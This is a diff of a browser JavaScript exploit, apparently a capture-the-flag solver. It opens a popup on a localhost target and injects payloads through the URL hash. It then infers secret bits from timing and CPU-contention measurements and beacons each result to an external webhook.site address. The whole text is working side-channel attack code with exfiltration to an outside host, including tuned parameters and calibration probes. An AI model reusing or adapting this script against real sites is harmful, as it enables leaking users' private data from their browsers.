@@ -4,15 +4,15 @@ var WH = "https://webhook.site/19df9959-1780-4948-a6c1-a6e5d7df5d90";
 var TARGET = "http://localhost:3000/";
 function q(k,d){var s=location.search+"&"+location.hash.replace(/^#/,"");var m=new RegExp("[?&#]"+k+"=([^&]*)").exec(s);return m?decodeURIComponent(m[1]):d;}
 var start = parseInt(q("start","0"),10);
-var ns    = parseInt(q("ns","16"),10);
-var pm    = parseInt(q("pm","350"),10);
-var bx    = parseInt(q("bx","2000"),10);
-var ly    = parseInt(q("ly","5"),10);
-var tsz   = q("ts","1,2,3,400,7");           // comma tile sizes
+var ns    = parseInt(q("ns","12"),10);
+var pm    = parseInt(q("pm","300"),10);
+var bx    = parseInt(q("bx","1500"),10);
+var ly    = parseInt(q("ly","6"),10);
+var tsz   = q("ts","7,53,131,307,21,89");
 var tiles = tsz.split(",").map(Number);
 var sid   = q("sid", Math.random().toString(36).slice(2,7));
 
-function beacon(tag,data){ try{ var i=new Image(); i.src = WH + "?sid="+sid+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(data)+"&t="+Date.now(); }catch(e){} }
+function beacon(tag,data){ try{ var i=new Image(); i.src = WH + "?sid="+sid+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(String(data))+"&t="+Date.now(); }catch(e){} }
 function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
 
 function payload(id){
@@ -27,32 +27,33 @@ var win=null, counter=0;
 async function measure(id){
   counter++;
   maxGap=0; lastT=performance.now();
+  var worstBusy=0, sink=0;
   try{ win.location = TARGET+"?n="+counter+"#"+encodeURIComponent(payload(id)); }catch(e){ beacon("err","loc "+e); }
-  await sleep(pm);
-  // CPU contention probe
-  var bstart=performance.now(), x=0; for(var i=0;i<3000000;i++){ x+=Math.sqrt(i*1.0001); }
-  var busy=performance.now()-bstart;
-  return {id:id, gap:Math.round(maxGap), busy:Math.round(busy)};
+  var end=performance.now()+pm;
+  while(performance.now()<end){
+    var b0=performance.now(); for(var i=0;i<200000;i++){ sink+=i*1.0001; } var dt=performance.now()-b0;
+    if(dt>worstBusy)worstBusy=dt;
+    await sleep(0);
+  }
+  return {id:id, gap:Math.round(maxGap), busy:Math.round(worstBusy*10)/10, s:sink};
 }
 
 (async function(){
-  beacon("ALIVE","ua="+navigator.userAgent.slice(0,40)+";cfg bx="+bx+" ly="+ly+" ts="+tsz+" pm="+pm+" start="+start+" ns="+ns);
-  try{ win=window.open(TARGET+"?init=1#hi","imp","width=900,height=700"); }catch(e){ beacon("err","open "+e); }
-  if(!win){ beacon("err","popup-null"); window.__IMPRESSION_DONE__=true; return; }
+  beacon("ALIVE","ua="+navigator.userAgent.slice(0,32)+";bx="+bx+";ly="+ly+";ts="+tsz+";pm="+pm+";start="+start+";ns="+ns);
+  try{ win=window.open(TARGET+"?init=1#hi","imp","width=1000,height=800"); }catch(e){ beacon("err","open "+e); }
+  if(!win){ beacon("err","popup-null"); try{window.__IMPRESSION_DONE__=true;}catch(e){} return; }
   setTimeout(tick,0);
-  await sleep(800);
-  // calibration: absent ids
+  await sleep(900);
   var cA=await measure("bit-999-0");
-  var cB=await measure("bit-888-1");
-  beacon("cal","A="+cA.gap+"/"+cA.busy+" B="+cB.gap+"/"+cB.busy);
+  var cB=await measure("bit-654-3");
+  beacon("cal","A="+cA.gap+"/"+cA.busy+";B="+cB.gap+"/"+cB.busy);
   for(var s=start;s<start+ns;s++){
     var row=[];
     for(var b=0;b<4;b++){ var r=await measure("bit-"+s+"-"+b); row.push(r.gap+"/"+r.busy); }
     beacon("s"+s, row.join(","));
   }
-  var cC=await measure("bit-777-2");
-  beacon("cal2","C="+cC.gap+"/"+cC.busy+" total="+counter);
-  beacon("DONE","sid="+sid);
+  var cC=await measure("bit-321-0");
+  beacon("done","C="+cC.gap+"/"+cC.busy+";n="+counter);
   try{ window.__IMPRESSION_DONE__=true; }catch(e){}
 })();
 })();
